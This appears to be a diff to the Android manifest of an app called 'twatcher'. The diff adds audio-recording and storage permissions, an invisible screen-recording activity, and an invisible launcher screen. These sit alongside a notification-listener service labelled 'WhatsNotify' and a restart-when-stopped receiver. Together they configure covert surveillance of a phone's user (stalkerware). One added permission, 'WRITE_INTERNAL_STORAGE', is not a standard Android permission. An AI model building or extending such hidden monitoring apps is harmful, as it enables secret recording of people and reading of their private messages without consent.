@@ -4,15 +4,24 @@
     package="com.example.twatcher">
 
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.WRITE_INTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
 
     <application
-        android:allowBackup="false"
         android:name=".App"
+        android:allowBackup="false"
         android:icon="@mipmap/ic_launcher"
         android:label="@string/app_name"
         android:roundIcon="@mipmap/ic_launcher_round"
-        tools:ignore="GoogleAppIndexingWarning"
-        android:supportsRtl="true">
+        android:supportsRtl="true"
+        tools:ignore="GoogleAppIndexingWarning">
+
+        <activity
+            android:name=".ScreenRecordingAcitivity"
+            android:theme="@style/Invisible"
+            android:exported="false">
+        </activity>
 
         <service
             android:name=".AutoStartService"
@@ -20,7 +29,6 @@
             android:exported="true"
             android:label="WhatsNotify"
             android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
-
             <intent-filter>
                 <action android:name="android.service.notification.NotificationListenerService" />
             </intent-filter>
@@ -33,17 +41,10 @@
             android:label="RestartServiceWhenStopped">
         </receiver>
 
-        <service
-            android:process=":serviceNonStoppable"
-            android:name=".serviceOn"
-            android:exported="false"
-            android:description="@string/service_description">
-        </service>
-
         <activity
             android:name=".MainActivity"
             android:label="@string/app_name"
-            android:theme="@style/Theme.AppCompat.NoActionBar">
+            android:theme="@style/Invisible">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
 
